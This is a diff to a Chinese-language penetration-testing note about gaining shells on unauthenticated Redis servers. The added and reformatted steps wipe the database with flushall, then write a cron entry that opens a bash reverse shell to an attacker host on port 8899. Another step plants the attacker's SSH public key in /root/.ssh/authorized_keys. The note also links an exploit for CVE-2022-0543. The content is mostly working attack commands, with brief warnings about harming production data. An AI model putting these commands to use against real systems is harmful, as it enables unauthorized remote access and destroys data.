@@ -36,23 +36,42 @@ save
 ```
 #### (2) 新建DB写文件->计划任务反弹shell
 
+
+>真实环境慎用，需要清空数据影响生产环境
+
+清空数据
 ```
 redis-cli -h 192.168.1.11
-config set dir /var/spool/cron
-set re "\n\n*/1 * * * * /bin/bash -i>&/dev/tcp/x.x.x.x/8899 0>&1\n\n"
-config set dbfilename root
-save
+redis> flushall
+```
+写计划文件
+```
+redis-cli -h 192.168.1.11
+redis> config set dir /var/spool/cron
+redis> set re "\n\n*/1 * * * * /bin/bash -i>&/dev/tcp/x.x.x.x/8899 0>&1\n\n"
+redis> config set dbfilename root
+redis> save
 ```
 
 #### (3) 新建DB写文件->公钥SSH连接
+
+>真实环境慎用，需要清空数据影响生产环境
+
+获取本地ssh公钥
 ```
 (echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > re.txt
 ```
+需要清空数据
+```
+redis-cli -h 192.168.1.11
+redis> flushall
+```
+写秘钥
 ```
 cat re.txt | redis-cli -h 192.168.1.11 -x set re
-config set dir /root/.ssh
-config set dbfilename authorized_keys
-save
+redis> config set dir /root/.ssh
+redis> config set dbfilename authorized_keys
+redis> save
 ```
 本地连接：
 ```
@@ -83,7 +102,8 @@ redis:
 #### (2) Redis沙盒绕过（CVE-2022-0543）
 - 附加条件： 2.2 <= redis < 5.0.13，2.2 <= redis < 6.0.15，2.2 <= redis < 6.2.5
 - 漏洞利用：https://github.com/aodsec/CVE-2022-0543
-#### （3）结合Jackson,Fastjosn等反序列化的漏洞利用（java）
+
+#### (3) 结合Jackson,Fastjosn等反序列化的漏洞利用（java）
 - 附加条件：Java 反序列化漏洞
 参考 [细数 redis 的几种 getshell 方法](https://paper.seebug.org/1169/)
 
